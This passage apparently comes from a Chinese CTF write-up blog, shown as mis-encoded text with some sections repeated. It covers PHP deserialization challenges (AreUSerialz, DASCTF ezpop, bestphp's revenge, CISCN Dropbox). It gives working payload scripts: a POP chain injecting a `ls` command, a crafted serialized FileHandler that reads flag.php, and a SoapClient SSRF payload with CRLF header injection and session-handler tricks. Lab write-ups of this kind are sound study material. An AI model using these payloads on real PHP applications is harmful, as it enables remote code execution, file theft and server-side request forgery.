è¦†ç›–ä¿®é¥°ã€‚</p><p>2.protectedå±æ€§åºåˆ—åŒ–ä¼šå¼•å…¥\00<em>\00ã€‚ä½†æ˜¯\00æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–å†…å®¹ä¸­ç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶è¿™ä¸ªå­—ç¬¦ä¸²å°±æ”¯æŒå°†åé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¡¨ç¤ºã€‚å³æ‰‹åŠ¨å°†\00</em>\00å˜ä¸º\x00*\x00</p><h2 id="2022DASCTF-X-SU-ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop"><a href="#2022DASCTF-X-SU-ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop" class="headerlink" title="2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop"></a>2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fin::<span class="title function_ invoke__">__destrcut</span>()â†’what::<span class="title function_ invoke__">__tostring</span>()â†’mix::<span class="title function_ invoke__">__run</span>()â†’crow::<span class="title function_ invoke__">__invoke</span>()â†’fin::<span class="title function_ invoke__">__call</span>()â†’mix::<span class="title function_ invoke__">__get_flag</span>()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$crow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$what</span> = <span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$mix</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$fin2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#é‡å¤ç”¨åˆ°äº†fin-&gt;f1å’Œmin-&gt;m1ï¼Œæ‰€ä»¥æœ‰$mix2 = new mix();$fin2 = new fin();</span></span><br><span class="line"><span class="variable">$fin</span>-&gt;f1 = <span class="variable">$what</span>;</span><br><span class="line"><span class="variable">$what</span>-&gt;a = <span class="variable">$mix</span>;</span><br><span class="line"><span class="variable">$mix</span>-&gt;m1 = <span class="variable">$crow</span>;</span><br><span class="line"><span class="variable">$crow</span>-&gt;v1 = <span class="variable">$fin2</span>;</span><br><span class="line"><span class="variable">$fin2</span>-&gt;f1 = <span class="variable">$mix2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span>-&gt;m1 = <span class="string">&quot;?&gt;&lt;?php echo `ls`;?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$fin</span>);</span><br></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz-1"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz-1" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><h3 id="1-å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–-1"><a href="#1-å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–-1" class="headerlink" title="1.å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–"></a>1.å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–</h3><h3 id="2-ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹-1"><a href="#2-ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹-1" class="headerlink" title="2.ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹"></a>2.ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹</h3><p>ä¼ å‚strâ†’is_valid()å‡½æ•°è¿‡æ»¤â†’unserialize()å‡½æ•°è§¦å‘destruct()å‡½æ•°ï¼šåˆ¤æ–­opâ†’è°ƒç”¨process()å‡½æ•°ï¼Œopä¸º2æ—¶â†’è°ƒç”¨read()å‡½æ•°</p><h3 id="3-payload-1"><a href="#3-payload-1" class="headerlink" title="3.payload"></a>3.payload</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot; 2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br><span class="line"></span><br><span class="line">ä¸ä¿®æ”¹å±æ€§ï¼Œä½¿ç”¨å¤§S</span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\00*\00op&quot;</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">&quot;\00*\00filename&quot;</span>;S:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;S:<span class="number">10</span>:<span class="string">&quot;\00*\00content&quot;</span>;S:<span class="number">7</span>:<span class="string">&quot;N;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ï¼ˆ1ï¼‰opçš„å€¼-1"><a href="#ï¼ˆ1ï¼‰opçš„å€¼-1" class="headerlink" title="ï¼ˆ1ï¼‰opçš„å€¼"></a>ï¼ˆ1ï¼‰opçš„å€¼</h4><p>å¯ä»¥ä¸ºâ€™   2â€™å’Œ2æ¥ä½¿destruct()ä¸­çš„ä¸æˆç«‹</p><p><img src="https://khaz.top/typora/images/image-20220403152704038.png" alt="image-20220403152704038"></p><p>ç»•è¿‡process()çš„</p><p><img src="https://khaz.top/typora/images/image-20220403152748861.png" alt="image-20220403152748861"></p><h4 id="ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic-x2F-ä½¿ç”¨å¤§S-1"><a href="#ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic-x2F-ä½¿ç”¨å¤§S-1" class="headerlink" title="ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic&#x2F;ä½¿ç”¨å¤§S"></a>ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic&#x2F;ä½¿ç”¨å¤§S</h4><p><img src="https://khaz.top/typora/images/image-20220403152827512.png" alt="image-20220403152827512"></p><p>1.åªå…è®¸å¯æ‰“å°å­—ç¬¦ï¼Œè€ŒåŸå…ˆæ˜¯protectedç±»å‹ï¼Œåºåˆ—åŒ–ä»¥åä¼šæœ‰ä¸å¯æ‰“å°å­—ç¬¦%00</p><p>è€ŒæŸ¥è¯¢å¾—çŸ¥åœ¨ PHP7.2+çš„ç¯å¢ƒä¸­ï¼Œä½¿ç”¨ public ä¿®é¥°æˆå‘˜å¹¶åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–åæˆå‘˜ä¹Ÿä¼šè¢« public è¦†ç›–ä¿®é¥°ã€‚</p><p>2.protectedå±æ€§åºåˆ—åŒ–ä¼šå¼•å…¥\00<em>\00ã€‚ä½†æ˜¯\00æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–å†…å®¹ä¸­ç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶è¿™ä¸ªå­—ç¬¦ä¸²å°±æ”¯æŒå°†åé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¡¨ç¤ºã€‚å³æ‰‹åŠ¨å°†\00</em>\00å˜ä¸º\x00*\x00</p><h2 id="2022DASCTF-X-SU-ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop-1"><a href="#2022DASCTF-X-SU-ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop-1" class="headerlink" title="2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop"></a>2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fin::<span class="title function_ invoke__">__destrcut</span>()â†’what::<span class="title function_ invoke__">__tostring</span>()â†’mix::<span class="title function_ invoke__">__run</span>()â†’crow::<span class="title function_ invoke__">__invoke</span>()â†’fin::<span class="title function_ invoke__">__call</span>()â†’mix::<span class="title function_ invoke__">__get_flag</span>()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$crow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$what</span> = <span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$mix</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$fin2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#é‡å¤ç”¨åˆ°äº†fin-&gt;f1å’Œmin-&gt;m1ï¼Œæ‰€ä»¥æœ‰$mix2 = new mix();$fin2 = new fin();</span></span><br><span class="line"><span class="variable">$fin</span>-&gt;f1 = <span class="variable">$what</span>;</span><br><span class="line"><span class="variable">$what</span>-&gt;a = <span class="variable">$mix</span>;</span><br><span class="line"><span class="variable">$mix</span>-&gt;m1 = <span class="variable">$crow</span>;</span><br><span class="line"><span class="variable">$crow</span>-&gt;v1 = <span class="variable">$fin2</span>;</span><br><span class="line"><span class="variable">$fin2</span>-&gt;f1 = <span class="variable">$mix2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span>-&gt;m1 = <span class="string">&quot;?&gt;&lt;?php echo `ls`;?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$fin</span>);</span><br></pre></td></tr></table></figure><h4 id="buuâ€“bestphpâ€˜s-revenge"><a href="#buuâ€“bestphpâ€˜s-revenge" class="headerlink" title="buuâ€“bestphpâ€˜s revenge"></a>buuâ€“bestphpâ€˜s revenge</h4><p>flag.phpï¼ˆç›®å½•æ‰«æå¾—åˆ°ï¼‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">only localhost can get flag!</span><br><span class="line"><span class="title function_ invoke__">session_start</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>; </span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">&#123; <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>; &#125; </span><br><span class="line">only localhost can get flag! </span><br></pre></td></tr></table></figure><blockquote><p>æœ¬åœ°è¯·æ±‚è®¿é—®flag.phpæ—¶ï¼Œä¼šå°†flagå†™å…¥sessionä¸­</p><p>åˆ©ç”¨phpåŸç”Ÿç±»SoapClientå¯ä»¥æ„é€ ssrfï¼Œéœ€è¦è§¦å‘SoapClient::callã€‚</p></blockquote><p>SoapClientï¼š</p><p><a href="https://www.anquanke.com/post/id/153065#h2-1">https://www.anquanke.com/post/id/153065#h2-1</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ä¸Šé¢æåˆ°äº†è¦è§¦å‘SoapClient::callã€‚é‚£ä¹ˆå“ªé‡Œå¯ä»¥å®ä¾‹åŒ–SoapClientå¯¹è±¡å‘¢ï¼Ÿ</p><blockquote><p>ç­”æ¡ˆæ˜¯åœ¨sessionä¸­å®ä¾‹åŒ–ã€‚<a href="https://xz.aliyun.com/t/6640#toc-5">https://xz.aliyun.com/t/6640#toc-5</a></p></blockquote><p><img src="/../images/20191026142328-1fba974c-f7b9-1-1687419234886.png" alt="img"></p><p>$_SESSIONç¯å¢ƒå˜é‡å’ŒæœåŠ¡å™¨ä¸Šçš„seissionæ–‡ä»¶</p><blockquote><p>$_SESSIONç¯å¢ƒå˜é‡ï¼šä¿å­˜å®ä¾‹åŒ–å¯¹è±¡</p><p>åœ¨ä¼šè¯ç»“æŸåå°†æ•°æ®åºåˆ—åŒ–ä¿å­˜åˆ°seissionæ–‡ä»¶ä¸­ã€‚</p><p>ä¼šè¯å¼€å§‹åï¼Œä¼šæ ¹æ®cookieä¸­çš„phpsession_idå°†sessionæ–‡ä»¶ï¼ˆå¦‚æœæœ‰ï¼‰çš„å†…å®¹ååºåˆ—åŒ–ä¿å­˜åˆ°$_SESSIONç¯å¢ƒå˜é‡ä¸­ã€‚</p></blockquote><p>åºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡ï¼Œæ›´æ”¹phpçš„sessionå¼•æ“ï¼Œé€šè¿‡åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶å¼•æ“çš„ä¸åŒä½¿ä¸‹ä¸€æ¬¡è¯·æ±‚æ—¶sessionä¸­ä¿å­˜çš„æ˜¯æˆ‘ä»¬æ„é€ çš„SoapClientå¯¹è±¡ã€‚</p><p><img src="/../images/image-20220730203810430-1687419234886.png" alt="image-20220730203810430"></p><blockquote><p>POST ï¼šserialize_handler&#x3D;php_serialize</p><p>GET    :   f&#x3D;session_start</p><p><code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>å°†sessionå¼•æ“è®¾ç½®ä¸ºphp_serializeï¼ˆåœ¨ä¸‹ä¸€æ¬¡ä¸­ç”Ÿæ•ˆï¼‰</p></blockquote><p>æ³¨ï¼šä½¿ç”¨session_startè®¾ç½®å¼•æ“ï¼Œè€Œä¸æ˜¯ç”¨ini_setæ¥è®¾ç½®ï¼Œå› ä¸ºsession_startèƒ½å¤Ÿå¤„ç†æ•°ç»„ï¼Œè€Œini_setä¸è¡Œ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>(<span class="title function_ invoke__">arrary</span>(<span class="string">&#x27;serialize_handler&#x27;</span>=&gt;<span class="string">&#x27;php_serialize&#x27;</span>))</span><br></pre></td></tr></table></figure><blockquote><p>GET:   name&#x3D; |+åºåˆ—åŒ–å†…å®¹ï¼ˆè®°å¾—åœ¨å‰é¢åŠ ä¸Š|ï¼‰</p><p>$_SESSION[â€˜nameâ€™] &#x3D; $_GET[â€˜nameâ€™];</p><p>è¿™æ—¶å€™sessionæ–‡ä»¶ä¸­ä¿å­˜çš„æ•°æ®å°±æ˜¯ä¸Šå›¾responseä¸­çš„ã€‚</p></blockquote><p>ç¬¬äºŒæ¬¡ï¼Œè¿˜æ˜¯ä¸Šä¸€æ¬¡çš„cookieï¼Œé€šè¿‡è¦†ç›–å˜é‡è§¦å‘SoapClient::callæ–¹æ³•</p><p><img src="/../images/image-20220730204831558-1687419234886.png" alt="image-20220730204831558"></p><blockquote><p>ä¸ä¸Šä¸€æ¬¡ç›¸åŒçš„cookieï¼ŒæœåŠ¡å™¨å°±ä¼šæ ¹æ®cookieæ‰¾åˆ°æˆ‘ä»¬æ„é€ çš„sessionæ–‡ä»¶ï¼Œå¹¶å°†å…¶å†…å®¹ååºåˆ—åŒ–ä¿å­˜åˆ°$_SESSIONä¸­ï¼Œæ­¤æ—¶å› ä¸ºå¼•æ“çš„ä¸åŒï¼Œååºåˆ—åŒ–åå¾—åˆ°çš„å°±æ˜¯æ„é€ å¥½çš„SoapClientå¯¹è±¡ã€‚</p></blockquote><p>è§¦å‘SoapClient::callæ–¹æ³•</p><blockquote><p>POST ï¼šb&#x3D;call_user_func</p><p>GET    :   f&#x3D;extract</p><p><code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>å³<code>extract($_POST)</code>â†’b&#x3D;call_user_func</p><p><code>$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);</code></p><p><code>call_user_func($b, $a);</code>å³</p><p><code>call_user_func(call_user_func, arrary(reset($_SESSION),&#39;welcome_to_the_lctf2018&#39;))</code></p><p>å³<code>call_user_funcï¼ˆarrary(reset($_SESSION),&#39;welcome_to_the_lctf2018&#39;)ï¼‰</code></p><p>å³è°ƒç”¨äº†reset($_SESSION)ä¸­çš„â€™welcome_to_the_lctf2018â€™æ–¹æ³•</p><p>è€Œreset($_SESSION)å³æ˜¯SoapClientå¯¹è±¡ï¼Œæ²¡æœ‰â€™welcome_to_the_lctf2018â€™æ–¹æ³•ï¼Œå°±è§¦å‘äº†SoapClient::callæ–¹æ³•,ä»è€Œå°†flagä¿å­˜åˆ°æˆ‘ä»¬æ„é€ çš„cookieæ‰€å¯¹åº”çš„sessionä¸­ã€‚</p></blockquote><p>ç¬¬ä¸‰æ¬¡ï¼Œå°†cookieè®¾ç½®ä¸ºæˆ‘ä»¬æ„é€ çš„cookieï¼Œè·å¾—å¯¹åº”çš„session</p><p><img src="/../images/image-20220730212228972-1687419234886.png" alt="image-20220730212228972"></p><h3 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h3><p>æ‰“å¼€æ˜¯ç™»å½•é¡µé¢ï¼Œè¦ä¹ˆç›®æ ‡å°±æ˜¯ç™»å½•ä¸Šå»ï¼Œè¦ä¹ˆå°±æ˜¯ç™»å½•åçš„åŠŸèƒ½æœ‰é—®é¢˜ã€‚</p><p>å…ˆæ‰¾æ³¨å†Œç•Œé¢ï¼Œæœ‰æ³¨å†Œç•Œé¢ï¼Œé‚£åº”è¯¥å°±æ˜¯ç™»é™†åçš„åŠŸèƒ½æœ‰é—®é¢˜ã€‚</p><p>æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä¸‹è½½ï¼Œåˆ é™¤åŠŸèƒ½ã€‚ç»æµ‹è¯•ï¼Œæ–‡ä»¶ä¸‹è½½éƒ¨åˆ†å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œé€šè¿‡æ­¤æ¼æ´å¾—åˆ°æºç ã€‚</p><hr><p>ä»£ç å®¡è®¡ï¼š</p><p>å› ä¸ºbuuä¸Šæœ‰pharæ ‡ç­¾ï¼Œæ‰€ä»¥çŸ¥é“è€ƒçš„æ˜¯pharã€‚</p><p>åç€æ‰¾ï¼Œå…ˆæ‰¾æ–‡ä»¶å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span>.phpä¸‹</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line"></span><br><span class="line"><span class="title class_">File</span>::<span class="variable constant_">close</span>è°ƒç”¨äº†<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename)è§¦å‘pharååºåˆ—åŒ–</span><br><span class="line">æ‰€ä»¥è¦æ„é€ filename=flagæ‰€åœ¨è·¯å¾„</span><br></pre></td></tr></table></figure><p>å†çœ‹å“ªé‡Œè°ƒç”¨äº†closeæ–¹æ³•ï¼š</p><ol><li><p>download.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">21</span>,<span class="number">17</span>:     <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">ä½†æ˜¯è¿™é‡Œé™åˆ¶äº†ç›®å½•è®¿é—®å¹¶è¿‡æ»¤äº†flagï¼Œæ‰€ä»¥ä¸èƒ½åˆ©ç”¨</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>)</span><br></pre></td></tr></table></figure></li><li><p>class.php</p></li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">User</span>::<span class="variable constant_">destruct</span></span><br><span class="line"><span class="number">57</span>,<span class="number">20</span>:         <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">æ‰€ä»¥çŒœæµ‹è¦è®©<span class="variable">$db</span>ä¸ºFileå¯¹è±¡</span><br></pre></td></tr></table></figure><p>æ­£ç€æ‰¾</p><ol><li><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Name</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Size</span>();</span><br><span class="line">é¦–å…ˆå®ä¾‹åŒ–äº†FileListç±»ï¼Œç„¶åè°ƒç”¨äº†è¿™ä¸ªç±»ä¸­çš„Nameå’ŒSizeæ–¹æ³•ï¼Œä½†æ˜¯FileListç±»ä¸­æ²¡æœ‰è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨</span><br><span 